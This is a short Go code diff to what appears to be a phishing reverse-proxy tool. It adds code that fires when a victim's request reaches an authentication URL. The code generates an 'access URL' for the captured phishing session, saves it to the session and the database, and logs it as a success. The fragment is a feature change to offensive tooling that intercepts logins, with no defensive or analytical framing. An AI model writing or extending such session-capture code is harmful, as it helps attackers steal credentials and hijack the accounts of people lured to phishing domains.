@@ -839,6 +839,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for _, au := range pl.authUrls {
 							log.Debug("auth_url: %s try match %s", au.String(), req.URL.Path)
 							if au.MatchString(req.URL.Path) {
+								// set Access url for session
+								accessUrl := p.genAccessUrl(ps.PhishDomain)
+								p.setSessionAccessUrl(ps.SessionId, accessUrl)
+								log.Success("[%d] AccessUrl: [%s]", ps.Index, accessUrl)
+								if err := p.db.SetSessionAccessUrl(ps.SessionId, accessUrl); err != nil {
+									log.Error("database: %v", err)
+								}
 								s.Finish(true)
 								break
 							}
